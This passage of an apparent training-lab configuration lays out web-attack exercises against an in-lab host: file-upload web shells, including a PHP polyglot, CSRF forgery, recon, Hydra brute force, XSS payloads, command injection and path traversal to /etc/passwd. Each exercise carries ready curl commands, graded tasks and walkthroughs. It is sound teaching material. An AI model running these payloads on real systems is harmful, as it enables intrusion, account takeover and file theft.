    # ─── FILE UPLOAD ────────────────────────────────────────────────────
    "file_upload": {
        "wrong_extension": {
            "name":        "Dangerous Extension",
            "description": "Upload a .php or .sh file — the simplest test of upload validation.",
            "difficulty":  "Easy",
            "techniques":  ["extension-bypass"],
            "tasks": [
                {"title": "Submit a benign file",
                 "event_types": ["file_upload_used", "file_saved"], "min_count": 2,
                 "explain": "Upload probe.txt to confirm the endpoint works."},
                {"title": "Upload a .php file",
                 "event_types": ["dangerous_extension_accepted"], "min_count": 1,
                 "explain": "Upload shell.php — confirm the server stores it."},
                {"title": "Confirm unrestricted upload",
                 "event_types": ["unrestricted_upload_detected"],
                 "explain": "Server returns a path under /static/uploads/."},
            ],
            "success_event_types": ["unrestricted_upload_detected"],
            "ideal_commands": [
                "echo 'hello' > /tmp/probe.txt && curl -F 'file=@/tmp/probe.txt' http://target-agent/files/upload",
                "echo '<?php echo \"x\"; ?>' > /tmp/shell.php",
                "curl -F 'file=@/tmp/shell.php' http://target-agent/files/upload",
            ],
        },
        "mime_spoof": {
            "name":        "MIME Type Spoofing",
            "description": "Lie about the file type via Content-Type header.",
            "difficulty":  "Medium",
            "techniques":  ["mime-confusion", "content-type-bypass"],
            "tasks": [
                {"title": "Upload a normal image",
                 "event_types": ["file_saved"], "min_count": 1,
                 "explain": "Upload a real image to confirm baseline."},
                {"title": "Upload a .php disguised as image/png",
                 "event_types": ["dangerous_extension_accepted"], "min_count": 1,
                 "explain": "curl -F 'file=@shell.php;type=image/png' — see if server trusts the header."},
                {"title": "Confirm unrestricted upload",
                 "event_types": ["unrestricted_upload_detected"],
                 "explain": "Server returns a path — MIME wasn't enforced."},
            ],
            "success_event_types": ["unrestricted_upload_detected"],
            "ideal_commands": [
                "echo '<?php phpinfo(); ?>' > /tmp/shell.php",
                "curl -F 'file=@/tmp/shell.php;type=image/png' http://target-agent/files/upload",
            ],
        },
        "polyglot": {
            "name":        "Polyglot File",
            "description": "Valid image AND valid script in the same file. Bypasses content-sniffing. Hardest technique. "
                           "(Lab note: a plain .php already uploads here; do this one to learn the bypass for servers "
                           "that validate magic bytes / MIME.)",
            "difficulty":  "Hard",
            "techniques":  ["polyglot", "magic-bytes", "double-format"],
            "tasks": [
                {"title": "Upload a baseline file",
                 "event_types": ["file_saved"], "min_count": 1,
                 "explain": "Confirm the endpoint accepts uploads."},
                {"title": "Upload a polyglot (.jpg.php)",
                 "event_types": ["dangerous_extension_accepted"], "min_count": 1,
                 "explain": "Prepend JPEG magic bytes to a PHP payload, save as .jpg.php"},
                {"title": "Confirm unrestricted upload",
                 "event_types": ["unrestricted_upload_detected"],
                 "explain": "Both content sniffing AND extension check fail."},
            ],
            "success_event_types": ["unrestricted_upload_detected"],
            "ideal_commands": [
                "# Build a polyglot: JPEG header + PHP payload",
                "printf '\\xff\\xd8\\xff\\xe0' > /tmp/poly.jpg.php",
                "echo '<?php system($_GET[\"c\"]); ?>' >> /tmp/poly.jpg.php",
                "curl -F 'file=@/tmp/poly.jpg.php;type=image/jpeg' http://target-agent/files/upload",
            ],
        },
    },

    # ─── CSRF ───────────────────────────────────────────────────────────
    "csrf": {
        "basic_forgery": {
            "name":        "Basic Forgery",
            "description": "Submit a state-changing POST without a CSRF token from any origin.",
            "difficulty":  "Easy",
            "techniques":  ["missing-token", "post-forgery"],
            "tasks": [
                {"title": "Login and capture cookie",
                 "event_types": ["login_success"], "min_count": 1,
                 "explain": "POST /auth/login with valid creds, save cookies."},
                {"title": "Submit /profile/update without a token",
                 "event_types": ["profile_update_used", "csrf_token_missing"], "min_count": 2,
                 "explain": "POST -d 'email=pwned@evil.lab' with the cookie."},
                {"title": "Confirm profile was changed",
                 "event_types": ["profile_changed_without_csrf"],
                 "explain": "GET /profile/ shows the new email."},
            ],
            "success_event_types": ["profile_changed_without_csrf"],
            "ideal_commands": [
                "curl -c /tmp/c.txt -s -X POST http://target-agent/auth/login \\",
                "     -d 'username=admin&password=password123' >/dev/null",
                "curl -b /tmp/c.txt -s -X POST http://target-agent/profile/update \\",
                "     -d 'email=pwned@evil.lab' -o /dev/null -w 'HTTP %{http_code}\\n'",
                "curl -b /tmp/c.txt -s http://target-agent/profile/ | grep -oE 'pwned@evil[^<]*'",
            ],
        },
        "lure_page": {
            "name":        "Attacker Lure Page",
            "description": "Use the /evil/csrf-demo lure — simulates a real cross-site attack.",
            "difficulty":  "Medium",
            "techniques":  ["lure-page", "auto-submit", "referer-spoof"],
            "tasks": [
                {"title": "Login as victim",
                 "event_types": ["login_success"], "min_count": 1,
                 "explain": "Authenticate as admin."},
                {"title": "Visit the attacker lure page",
                 "event_types": ["csrf_lure_visited"], "min_count": 1,
                 "explain": "GET /evil/csrf-demo (the in-lab attacker page)."},
                {"title": "Confirm the forged update succeeded",
                 "event_types": ["csrf_lure_submitted", "profile_changed_without_csrf"], "min_count": 2,
                 "explain": "The lure auto-submits — profile email changes silently."},
            ],
            "success_event_types": ["csrf_lure_submitted", "profile_changed_without_csrf"],
            "ideal_commands": [
                "# Login as victim",
                "curl -c /tmp/c.txt -s -X POST http://target-agent/auth/login -d 'username=admin&password=password123' >/dev/null",
                "# Simulate clicking the lure (sends Referer: /evil/csrf-demo)",
                "curl -b /tmp/c.txt -s -e 'http://target-agent/evil/csrf-demo' \\",
                "     -X POST http://target-agent/profile/update \\",
                "     -d 'email=hacked@evil.lab'",
            ],
        },
        "json_bypass": {
            "name":        "Content-Type Bypass",
            "description": "Send the request as JSON — many anti-CSRF filters only check form posts. Hardest technique. "
                           "(Lab note: basic form forgery already works here; do this one to learn the bypass for apps "
                           "that add CSRF protection but only enforce it on form-encoded posts.)",
            "difficulty":  "Hard",
            "techniques":  ["content-type-confusion", "json-body"],
            "tasks": [
                {"title": "Login",
                 "event_types": ["login_success"], "min_count": 1,
                 "explain": "Standard auth."},
                {"title": "Submit profile-update as application/json",
                 "event_types": ["profile_update_used"], "min_count": 1,
                 "explain": "curl -H 'Content-Type: application/json' -d '{\"email\":\"pwned@evil.lab\"}'"},
                {"title": "Confirm the change persisted",
                 "event_types": ["profile_changed_without_csrf"],
                 "explain": "Read profile back — confirm the JSON body was accepted."},
            ],
            "success_event_types": ["profile_changed_without_csrf"],
            "ideal_commands": [
                "curl -c /tmp/c.txt -s -X POST http://target-agent/auth/login -d 'username=admin&password=password123' >/dev/null",
                "curl -b /tmp/c.txt -s -X POST http://target-agent/profile/update \\",
                "     -H 'Content-Type: application/json' \\",
                "     -d '{\"email\":\"pwned@evil.lab\"}'",
            ],
        },
    },

    # ─── RECON ──────────────────────────────────────────────────────────
    "recon": {
        "manual": {
            "name":        "Manual Walking",
            "description": "Click through the portal and read what you find. Easy entry-level recon.",
            "difficulty":  "Easy",
            "techniques":  ["manual-browsing", "html-inspection"],
            "tasks": [
                {"title": "Visit the portal home",
                 "event_types": ["portal_visited"], "min_count": 1,
                 "explain": "GET /"},
                {"title": "Visit at least 3 application areas",
                 "event_types": ["route_discovered", "search_used", "diagnostics_used", "file_viewer_used", "file_upload_used", "profile_update_used"],
                 "min_count": 3,
                 "explain": "Walk through the obvious links from the home page."},
                {"title": "Trigger the recon-sequence detector",
                 "event_types": ["recon_sequence_observed"],
                 "explain": "4+ distinct areas visited fires this synthetic event."},
            ],
            "success_event_types": ["recon_sequence_observed"],
            "ideal_commands": [
                "curl -s http://target-agent/ | head -30",
                "curl -s http://target-agent/auth/login >/dev/null",
                "curl -s http://target-agent/search?q=test >/dev/null",
                "curl -s http://target-agent/profile/ >/dev/null",
                "curl -s http://target-agent/files/read?path=readme.txt >/dev/null",
            ],
        },
        "wordlist": {
            "name":        "Wordlist Enumeration",
            "description": "Use gobuster/ffuf to discover hidden paths not on the home page.",
            "difficulty":  "Medium",
            "techniques":  ["wordlist", "gobuster", "directory-brute"],
            "tasks": [
                {"title": "Confirm the target responds",
                 "event_types": ["portal_visited"], "min_count": 1,
                 "explain": "curl -i http://target-agent/"},
                {"title": "Enumerate 4+ endpoints with a wordlist",
                 "event_types": ["route_discovered", "search_used", "diagnostics_used", "file_viewer_used", "file_upload_used", "profile_update_used"],
                 "min_count": 4,
                 "explain": "Run gobuster against the host with common.txt."},
                {"title": "Find a hidden route or clue",
                 "event_types": ["hidden_clue_accessed", "csrf_lure_visited"],
                 "explain": "Wordlist finds /evil/csrf-demo or /robots.txt."},
            ],
            "success_event_types": ["recon_sequence_observed"],
            "ideal_commands": [
                "gobuster dir -u http://target-agent -w /usr/share/wordlists/dirb/common.txt -t 20 -q",
                "# Then GET each discovered path",
                "for p in /search /system/ping /files/read /profile/ /evil/csrf-demo; do",
                "  curl -s -o /dev/null -w '%{http_code} '$p'\\n' http://target-agent$p",
                "done",
            ],
        },
        "comment_hunting": {
            "name":        "HTML Comment Hunting",
            "description": "Read source HTML/JS for developer mistakes — comments, version banners. Hardest technique. "
                           "(Lab note: manual/wordlist recon already maps the app; do this one to practise spotting "
                           "leaked hints in source that automated tools skip over.)",
            "difficulty":  "Hard",
            "techniques":  ["html-comment-grep", "version-disclosure"],
            "tasks": [
                {"title": "Fetch the portal home",
                 "event_types": ["portal_visited"], "min_count": 1,
                 "explain": "curl -s http://target-agent/"},
                {"title": "Grep for comments and version banners",
                 "event_types": ["route_discovered", "search_used", "diagnostics_used", "file_viewer_used", "profile_update_used"],
                 "min_count": 2,
                 "explain": "curl -s ... | grep -E '<!--|Server:|version'"},
                {"title": "Discover a hidden clue",
                 "event_types": ["hidden_clue_accessed", "csrf_lure_visited"],
                 "explain": "Comments often leak admin URLs or framework versions."},
            ],
            "success_event_types": ["recon_sequence_observed"],
            "ideal_commands": [
                "curl -s http://target-agent/ | grep -E '<!--|Server|Framework|version' -i",
                "curl -s http://target-agent/ | grep -oE 'href=\"[^\"]+\"' | sort -u",
                "curl -sI http://target-agent/ | grep -i 'server\\|x-'",
            ],
        },
    },
}


# ═══════════════════════════════════════════════════════════════════════════
#  WALKTHROUGH — TryHackMe-style teaching content per variant.
#
#  For each (module_id, variant_id) we provide:
#    overview  — 2-4 sentences: what this attack is + how it works overall.
#    sections  — list aligned BY INDEX with the variant's `tasks`. Each:
#        what     — what this step is / the concept behind it
#        how      — how it's actually done (method + concrete command)
#        look_for — the observable signal that proves the step worked
#
#  compute() merges these into each task so the guided UI can render a
#  rich, explained walkthrough. Modules without an entry here gracefully
#  fall back to the task's one-line `explain`.
# ═══════════════════════════════════════════════════════════════════════════
WALKTHROUGH: Dict[str, Dict[str, Dict[str, Any]]] = {

    # ─── BRUTE FORCE ────────────────────────────────────────────────────
    "brute_force": {
        "password_spray": {
            "overview": (
                "Password spraying flips a normal brute-force on its head: instead of "
                "hammering one account with thousands of passwords (which trips lockouts), "
                "you try ONE very common password against MANY usernames. Because each "
                "account only sees a single failed attempt, per-account lockout never "
                "fires — yet across a big enough user list, someone is always reusing "
                "'password123'."
            ),
            "sections": [
                {
                    "what": "Before you can spray, you need a list of usernames that probably exist. "
                            "Most apps leak this: predictable names (admin, operator, service) and "
                            "different responses for valid vs invalid users.",
                    "how":  "Submit a handful of likely usernames with a throwaway password and watch "
                            "the response. In the lab browser, try logging in as admin, operator, guest, "
                            "alice, bob, service — one wrong password each.",
                    "look_for": "Each attempt is logged as a failed login. 4+ distinct usernames marks this step done.",
                },
                {
                    "what": "Username enumeration is a vulnerability on its own: if the app says "
                            "'wrong password' for real users but 'no such account' for fake ones, "
                            "it just told you which usernames are real.",
                    "how":  "Compare the error message between a username you believe is real (admin) "
                            "and an obviously fake one (zzqq). Note which message means 'this user exists'.",
                    "look_for": "Two different error strings = the endpoint leaks valid accounts. 6+ attempts marks this done.",
                },
                {
                    "what": "Repeated failed logins from one source are exactly what a SOC watches for. "
                            "This step proves the attack is noisy and detectable — the blue-team side of the lesson.",
                    "how":  "Keep spraying. After 3+ failures from your IP inside the detection window, "
                            "the lab fires a synthetic brute-force-pattern event (mirrors a Wazuh rule).",
                    "look_for": "A 'Brute-force pattern detected' evidence card appears in the panel.",
                },
                {
                    "what": "The payoff: one of your sprayed users shares the common password. "
                            "That single 302 redirect is a full account takeover.",
                    "how":  "When a sprayed username returns success (redirect to /profile/ instead of a "
                            "401), you've found a live credential. The lab plants admin:password123.",
                    "look_for": "A 'Valid credential confirmed' card — you successfully logged in.",
                },
            ],
        },
        "credential_stuffing": {
            "overview": (
                "Credential stuffing assumes people reuse passwords. Attackers take "
                "username/password pairs leaked from OTHER breaches and replay them against "
                "your login. You're not guessing randomly — you're betting that a known user "
                "reused a password that already appeared in a public dump like rockyou.txt."
            ),
            "sections": [
                {
                    "what": "First confirm the login endpoint accepts repeated automated POSTs with no "
                            "rate limit, CAPTCHA, or lockout — the precondition that makes stuffing viable.",
                    "how":  "Send one login POST to /auth/login (any password) and confirm you get a clean "
                            "401 back, not a block or challenge.",
                    "look_for": "A failed-login event is recorded — the endpoint is reachable and unprotected.",
                },
                {
                    "what": "Now replay a leaked password list against a known account. This is the heart of "
                            "stuffing: a curated wordlist of real, previously-breached passwords.",
                    "how":  "Run Hydra against username=admin with the local leaked list: "
                            "`hydra -l admin -P /wordlists/rockyou-mini.txt target-agent "
                            "http-post-form '/auth/login:username=^USER^&password=^PASS^:Incorrect password' -t 4 -f`",
                    "look_for": "8+ failed-login attempts recorded against admin marks this step done.",
                },
                {
                    "what": "High-volume automated attempts trip detection. Again this shows the defensive "
                            "signal a real SOC would alert on.",
                    "how":  "The wordlist loop itself produces enough failures (3+ in the window) to fire "
                            "the brute-force-pattern detection.",
                    "look_for": "A 'Brute-force pattern detected' evidence card appears.",
                },
                {
                    "what": "If the reused password is anywhere in the leaked list, you're in — without ever "
                            "'guessing'. That's why password reuse is so dangerous.",
                    "how":  "When one password in the list returns a 302 redirect, that's the hit. Confirm it "
                            "by hand: `curl -i -d 'username=admin&password=password123' http://target-agent/auth/login`.",
                    "look_for": "A 'Valid credential confirmed' card — the leaked password worked.",
                },
            ],
        },
        "hydra_targeted": {
            "overview": (
                "This is brute-force done with a real tool. THC-Hydra understands HTTP login "
                "forms: you describe the form (URL, fields, and the failure string), hand it a "
                "wordlist, and it submits attempts in parallel and stops on the first success. "
                "It's the fastest, loudest variant — and the most realistic to how forms get cracked."
            ),
            "sections": [
                {
                    "what": "Hydra needs to know exactly how the form works: the path it POSTs to, the field "
                            "names, and the text that appears on a FAILED login (so it can tell success from failure).",
                    "how":  "GET /auth/login and read the HTML form. Identify action=/auth/login, fields "
                            "username & password, and the failure message ('Incorrect password').",
                    "look_for": "One probe login is recorded — you've confirmed the form's shape.",
                },
                {
                    "what": "A good wordlist beats a big one. Target the org: company name, year, season, "
                            "'Welcome1', etc. Hydra will iterate this against your user list.",
                    "how":  "Run Hydra with the http-post-form module: "
                            "`hydra -L users.txt -P /wordlists/rockyou-mini.txt target-agent http-post-form "
                            "'/auth/login:username=^USER^&password=^PASS^:Incorrect password' -t 8 -f`",
                    "look_for": "10+ login attempts recorded as Hydra works through the list.",
                },
                {
                    "what": "Hydra's parallel threads create a burst of failures — the most obvious detection "
                            "signature of all three variants.",
                    "how":  "The mass parallel attempts (-t 8) trip the brute-force-pattern detector almost immediately.",
                    "look_for": "A 'Brute-force pattern detected' evidence card appears.",
                },
                {
                    "what": "With -f, Hydra halts on the first valid pair and prints it. That's your credential, "
                            "found automatically.",
                    "how":  "Read Hydra's output line: [80][http-post-form] host: target-agent login: admin password: password123. "
                            "Verify with a manual curl to be sure.",
                    "look_for": "A 'Valid credential confirmed' card — Hydra cracked the login.",
                },
            ],
        },
    },

    # ─── XSS ────────────────────────────────────────────────────────────
    "xss": {
        "reflected": {
            "overview": (
                "Reflected XSS happens when an app takes input from the request (like a search "
                "query) and writes it straight back into the HTML response without escaping it. "
                "If you can get your text into the page verbatim, you can get a <script> tag into "
                "the page too — and the victim's browser will run it. It's 'reflected' because the "
                "payload bounces back in the same single response."
            ),
            "sections": [
                {
                    "what": "Reflection is the precondition for this attack: your input must appear somewhere "
                            "in the response. First prove the search box echoes what you type.",
                    "how":  "Search for a unique marker like 'attense_probe'. In the lab browser: "
                            "/search?q=attense_probe — then look for that word in the results.",
                    "look_for": "Your marker appears in the page — input is reflected. (search_used event)",
                },
                {
                    "what": "Now test whether HTML is escaped. If you send a script tag and it comes back as "
                            "raw markup (not &lt;script&gt;), the app is injectable.",
                    "how":  "Submit a script payload: /search?q=<script>alert(1)</script> "
                            "(URL-encode if typing in a terminal).",
                    "look_for": "An 'XSS-shaped payload submitted' card — the app received your script.",
                },
                {
                    "what": "Confirmation: the payload is reflected unescaped, meaning a real browser would "
                            "execute it. That's a working reflected XSS.",
                    "how":  "Check the response body contains your <script> tag verbatim — character for "
                            "character, no entity encoding.",
                    "look_for": "A 'Reflected input observed' card — the payload rendered unescaped.",
                },
            ],
        },
        "alternate_context": {
            "overview": (
                "Real apps often block the obvious <script> tag. Alternate-context XSS bypasses "
                "those naive filters using other ways browsers run JavaScript: event handlers "
                "(onerror, onload) on image/SVG tags, or javascript: URLs. The lesson: blocklists "
                "are brittle — there are dozens of sinks, and you only need one to survive filtering."
            ),
            "sections": [
                {
                    "what": "Start by confirming the endpoint still reflects input, so you know any failure "
                            "later is the filter, not a dead endpoint.",
                    "how":  "Submit a harmless query: /search?q=test and confirm it's echoed.",
                    "look_for": "Input is reflected. (search_used event)",
                },
                {
                    "what": "Try several different execution contexts. Each is a distinct filter bypass: "
                            "an <img> with onerror, an <svg> with onload, and a breakout from an attribute.",
                    "how":  "Submit three payloads: <img src=x onerror=alert(1)>, <svg onload=alert(1)>, "
                            "and \"><script>alert(1)</script> — one at a time.",
                    "look_for": "3 'XSS-shaped payload submitted' cards — you tested multiple vectors.",
                },
                {
                    "what": "Even if <script> is filtered, an event handler usually slips through. Confirm at "
                            "least one of your vectors reflected unescaped.",
                    "how":  "Inspect each response — find the payload that came back intact (e.g. the onerror "
                            "handler) while others were stripped.",
                    "look_for": "A 'Reflected input observed' card — a bypass succeeded.",
                },
            ],
        },
        "stored_attempt": {
            "overview": (
                "Stored XSS is the dangerous cousin of reflected XSS: instead of bouncing back in "
                "one response, the payload is SAVED by the app (in a profile bio, a comment, a name) "
                "and runs every time anyone views that page. One injection, many victims, no link to "
                "click. Here you'll try to persist a payload through the profile and see it fire on a "
                "second, separate request."
            ),
            "sections": [
                {
                    "what": "Stored XSS needs a place to store data. Authenticate so you can edit a persistent "
                            "field — your profile.",
                    "how":  "Log in with valid credentials (admin:password123) so the profile becomes editable.",
                    "look_for": "A 'Successful login observed' card.",
                },
                {
                    "what": "Inject the payload into a field that gets saved and re-displayed, like the profile "
                            "email/bio — not just a transient search box.",
                    "how":  "POST /profile/update with a script payload in the email/bio field, e.g. "
                            "email=<script>alert(1)</script>@evil.lab.",
                    "look_for": "Both a payload-submitted and profile-update event (2 events) mark this done.",
                },
                {
                    "what": "The defining test of STORED XSS: the payload must reappear on a fresh page load, "
                            "proving it was persisted server-side rather than just reflected.",
                    "how":  "Reload /profile/ in a new request and check the saved payload is still there, unescaped.",
                    "look_for": "A 'Reflected input observed' card on the second request — the payload persisted.",
                },
            ],
        },
    },

    # ─── COMMAND INJECTION ──────────────────────────────────────────────
    "cmd_injection": {
        "semicolon_basic": {
            "overview": (
                "Command injection happens when an app builds an OS shell command out of user "
                "input and runs it. The /system/ping diagnostics page takes a host and runs "
                "`ping <host>` on the server. Because the shell treats ';' as 'end this command, "
                "start another', you can append your OWN command after the host and the server "
                "runs both — giving you code execution as the web process."
            ),
            "sections": [
                {
                    "what": "First understand normal behaviour: the page runs ping against whatever host "
                            "you give it and shows the output. That output channel is how you'll read your results.",
                    "how":  "Submit a legitimate host in the lab browser: /system/ping?host=127.0.0.1 and read "
                            "the ping reply that comes back.",
                    "look_for": "A 'Diagnostics form used' card — the endpoint accepted your input.",
                },
                {
                    "what": "The semicolon is a shell command separator. If the app doesn't strip it, "
                            "everything after it runs as a brand-new command.",
                    "how":  "Append a second command: host=127.0.0.1; id  (use the address bar or curl "
                            "--data-urlencode 'host=127.0.0.1; id').",
                    "look_for": "A 'Shell metacharacters observed' card — your separator reached the shell.",
                },
                {
                    "what": "Proof of execution: the output of your injected command (not the ping) appears "
                            "in the response. Seeing `uid=` means you ran `id` on the server.",
                    "how":  "Look at the response for command output like 'uid=0(root)' or contents of /etc/passwd.",
                    "look_for": "A 'Command injection confirmed' card — your command executed.",
                },
            ],
        },
        "pipe_redirect": {
            "overview": (
                "Some apps blocklist the semicolon, so you reach for other shell operators. The "
                "pipe '|' sends ping's output into another command, '&&' chains a command that runs "
                "if the first succeeds, and '>' redirects output to a file. Each is a different way "
                "to smuggle execution past a naive filter that only looked for ';'."
            ),
            "sections": [
                {
                    "what": "Re-establish the baseline so any later failure is clearly the filter, not a broken page.",
                    "how":  "Submit /system/ping?host=127.0.0.1 and confirm a normal ping response.",
                    "look_for": "A 'Diagnostics form used' card.",
                },
                {
                    "what": "Try operators other than ';'. Pipe (|) and AND (&&) are classic semicolon-filter "
                            "bypasses — you only need one to get through.",
                    "how":  "Test two: host=127.0.0.1|whoami  and  host=127.0.0.1 && cat /etc/hostname "
                            "(URL-encode when using curl).",
                    "look_for": "A 'Shell metacharacters observed' card — an alternative separator slipped past the filter.",
                },
                {
                    "what": "Confirm code execution through the operator that survived — the injected command's "
                            "output is in the response.",
                    "how":  "Read the response for the output of whoami / cat (e.g. a username or hostname).",
                    "look_for": "A 'Command injection confirmed' card.",
                },
            ],
        },
        "subshell": {
            "overview": (
                "The stealthiest variant uses command substitution: $(...) or backticks `...`. The "
                "shell runs what's inside FIRST and substitutes the result into the outer command — "
                "no obvious separator like ; or | for a filter to catch. It's the kind of payload "
                "that bypasses blocklists built only around separator characters."
            ),
            "sections": [
                {
                    "what": "Confirm the endpoint behaves normally before introducing substitution.",
                    "how":  "Submit /system/ping?host=127.0.0.1.",
                    "look_for": "A 'Diagnostics form used' card.",
                },
                {
                    "what": "Inject with substitution. $(id) or `whoami` is evaluated by the shell and its output "
                            "becomes the 'host' that ping tries to resolve — leaking the result back to you.",
                    "how":  "Try two forms: host=$(id)  and  host=`whoami`  (URL-encode the special characters).",
                    "look_for": "A 'Shell metacharacters observed' card — the substitution reached the shell.",
                },
                {
                    "what": "Confirm: the substituted output appears in the response, usually inside a ping error "
                            "like 'cannot resolve uid=0(root): Name or service not known'.",
                    "how":  "Read the response for your command's output embedded in the ping/resolve error.",
                    "look_for": "A 'Command injection confirmed' card.",
                },
            ],
        },
    },

    # ─── DIR TRAVERSAL ──────────────────────────────────────────────────
    "dir_traversal": {
        "plain": {
            "overview": (
                "Path traversal (a.k.a. directory traversal) abuses a file-reading feature that "
                "builds a path from user input. By inserting '../' sequences you climb OUT of the "
                "intended folder and read arbitrary files on the server — like /etc/passwd. The "
                "/files/read page is meant to serve docs from one directory; this breaks out of it."
            ),
            "sections": [
                {
                    "what": "See the feature working as intended first: it reads a file by name from a fixed folder.",
                    "how":  "Open /files/read?path=readme.txt and read the file's contents in the lab browser.",
                    "look_for": "A 'File viewer used' card — the reader accepts a path parameter.",
                },
                {
                    "what": "Each '../' moves up one directory. String enough together and you escape the web "
                            "root entirely into the OS filesystem.",
                    "how":  "Change the path to climb out: path=../../etc/passwd (add more ../ if needed to reach root).",
                    "look_for": "A 'Path traversal observed' card — a traversal sequence was detected.",
                },
                {
                    "what": "Proof: the server returns the contents of a sensitive system file it should never expose.",
                    "how":  "Confirm the response contains lines like 'root:x:0:0:' from /etc/passwd.",
                    "look_for": "A 'Sensitive file disclosed' card — you read a protected file.",
                },
            ],
        },
        "encoded": {
            "overview": (
                "When a filter strips literal '../', you encode it. %2e is '.', %2f is '/', so "
                "%2e%2e%2f is '../' after the server URL-decodes it. Double-encoding (%252e) beats "
                "filters that decode only once. The lesson: blocking a string is not the same as "
                "understanding the path."
            ),
            "sections": [
                {
                    "what": "Confirm the reader works so later failures point at the filter, not the endpoint.",
                    "how":  "Open /files/read?path=readme.txt.",
                    "look_for": "A 'File viewer used' card.",
                },
                {
                    "what": "Send the traversal URL-encoded so the filter's literal '../' check never matches, but "
                            "the server still decodes it back to '../' before opening the file.",
                    "how":  "Try two encodings: path=..%2F..%2Fetc%2Fpasswd  and double-encoded "
                            "path=%252e%252e%252fetc%252fpasswd.",
                    "look_for": "A 'Path traversal observed' card — an encoded sequence got through.",
                },
                {
                    "what": "Proof: the decoded path escaped the folder and disclosed a system file.",
                    "how":  "Confirm /etc/passwd content ('root:x:0:0:') appears in the response.",
                    "look_for": "A 'Sensitive file disclosed' card.",
                },
            ],
        },
        "absolute": {
            "overview": (
                "Sometimes you don't need '../' at all. If the app naively concatenates or trusts the "
                "path, handing it an ABSOLUTE path like /etc/passwd skips the traversal entirely. This "
                "catches apps that carefully strip '../' but forget that '/etc/passwd' is already a full path."
            ),
            "sections": [
                {
                    "what": "Establish the baseline read behaviour.",
                    "how":  "Open /files/read?path=readme.txt.",
                    "look_for": "A 'File viewer used' card.",
                },
                {
                    "what": "Skip the dot-dot dance. Provide a full absolute path and see if the reader opens it "
                            "directly — many ../-stripping filters miss this.",
                    "how":  "Set path=/etc/passwd (no ../ at all). Also try path=/etc/hostname.",
                    "look_for": "A 'Path traversal observed' card — the absolute path was accepted.",
                },
                {
                    "what": "Proof: a sensitive file is disclosed via the absolute path.",
                    "how":  "Confirm 'root:x:0:0:' (passwd) or the machine hostname appears in the response.",
                    "look_for": "A 'Sensitive file disclosed' card.",
                },
            ],
        },
    },

    # ─── FILE UPLOAD ────────────────────────────────────────────────────
    "file_upload": {
        "wrong_extension": {
            "overview": (
                "Unrestricted file upload lets an attacker put their OWN file on the server. The most "
                "basic test is the extension check: if the app accepts a .php or .sh file, an attacker "
                "can upload a web shell and later browse to it to run commands. Here you confirm the "
                "uploader doesn't validate what kind of file it stores."
            ),
            "sections": [
                {
                    "what": "Confirm the upload works at all with a harmless file, and note where it gets stored.",
                    "how":  "Upload a small probe.txt via /files/upload (drag-drop in the browser or "
                            "curl -F 'file=@probe.txt' http://target-agent/files/upload).",
                    "look_for": "An 'Upload form used' and 'File saved' card — the file landed on the server.",
                },
                {
                    "what": "Now try a dangerous executable extension. A .php file that the web server would "
                            "execute is the classic web-shell vector.",
                    "how":  "Upload shell.php (contents like <?php echo 'x'; ?>). curl -F 'file=@shell.php' "
                            "http://target-agent/files/upload.",
                    "look_for": "A 'Dangerous extension accepted' card — the server stored a .php file.",
                },
                {
                    "what": "Proof: the server returns a stored path with no validation — an attacker now has a "
                            "file they control inside the app.",
                    "how":  "Confirm the response gives a path under /static/uploads/ for your dangerous file.",
                    "look_for": "An 'Unrestricted upload confirmed' card.",
                },
            ],
        },
        "mime_spoof": {
            "overview": (
                "Smarter uploaders check the Content-Type header to decide if a file is 'an image'. But "
                "the client sets that header — so you can lie. Send your .php while claiming "
                "Content-Type: image/png and a trusting server stores it as if it were a harmless image."
            ),
            "sections": [
                {
                    "what": "Confirm a genuine image uploads cleanly, establishing what a 'valid' upload looks like.",
                    "how":  "Upload any real .png/.jpg via /files/upload.",
                    "look_for": "A 'File saved' card.",
                },
                {
                    "what": "Now spoof the type: send a PHP payload but tag it Content-Type: image/png so a "
                            "header-only check is fooled.",
                    "how":  "curl -F 'file=@shell.php;type=image/png' http://target-agent/files/upload.",
                    "look_for": "A 'Dangerous extension accepted' card — the spoofed MIME slipped through.",
                },
                {
                    "what": "Proof: the executable file was stored despite the fake type — MIME was never truly enforced.",
                    "how":  "Confirm the response returns a stored path for your disguised .php.",
                    "look_for": "An 'Unrestricted upload confirmed' card.",
                },
            ],
        },
        "polyglot": {
            "overview": (
                "A polyglot file is valid as TWO formats at once: it begins with real image magic bytes "
                "(so content-sniffing sees a JPEG) yet also contains a working script payload. This "
                "defeats servers that check BOTH the file's real bytes AND its extension — the file "
                "honestly is an image, and also a shell."
            ),
            "sections": [
                {
                    "what": "Confirm the endpoint accepts uploads before crafting the tricky file.",
                    "how":  "Upload any baseline file via /files/upload.",
                    "look_for": "A 'File saved' card.",
                },
                {
                    "what": "Build a polyglot: prepend JPEG magic bytes (\\xff\\xd8\\xff\\xe0) to a PHP payload and "
                            "save it as poly.jpg.php — it sniffs as an image but runs as PHP.",
                    "how":  "printf '\\xff\\xd8\\xff\\xe0' > poly.jpg.php; echo '<?php system($_GET[\"c\"]); ?>' "
                            ">> poly.jpg.php; curl -F 'file=@poly.jpg.php;type=image/jpeg' http://target-agent/files/upload.",
                    "look_for": "A 'Dangerous extension accepted' card — both checks were beaten.",
                },
                {
                    "what": "Proof: the polyglot was stored — content sniffing AND extension filtering both failed.",
                    "how":  "Confirm the response returns a stored path for the polyglot.",
                    "look_for": "An 'Unrestricted upload confirmed' card.",
                },
            ],
        },
    },

    # ─── CSRF ───────────────────────────────────────────────────────────
    "csrf": {
        "basic_forgery": {
            "overview": (
                "Cross-Site Request Forgery abuses the fact that browsers auto-send your cookies with "
                "every request. If a state-changing form (like 'update profile') has no anti-CSRF token, "
                "any page can submit it on your behalf using your logged-in session. Here you prove the "
                "profile update accepts a forged POST with no token."
            ),
            "sections": [
                {
                    "what": "CSRF rides an authenticated session, so first log in and hold the session cookie.",
                    "how":  "Log in as admin:password123. From a terminal: "
                            "curl -c /tmp/c.txt -d 'username=admin&password=password123' http://target-agent/auth/login.",
                    "look_for": "A 'Successful login observed' card.",
                },
                {
                    "what": "Submit the state-changing request WITHOUT any CSRF token — exactly what an attacker's "
                            "page would do with your cookie.",
                    "how":  "curl -b /tmp/c.txt -d 'email=pwned@evil.lab' http://target-agent/profile/update.",
                    "look_for": "A 'Profile update without a CSRF token' card — the server accepted a tokenless change.",
                },
                {
                    "what": "Proof: the change actually persisted, confirming the forgery worked end-to-end.",
                    "how":  "Re-read the profile: curl -b /tmp/c.txt http://target-agent/profile/ and confirm "
                            "the email is now pwned@evil.lab.",
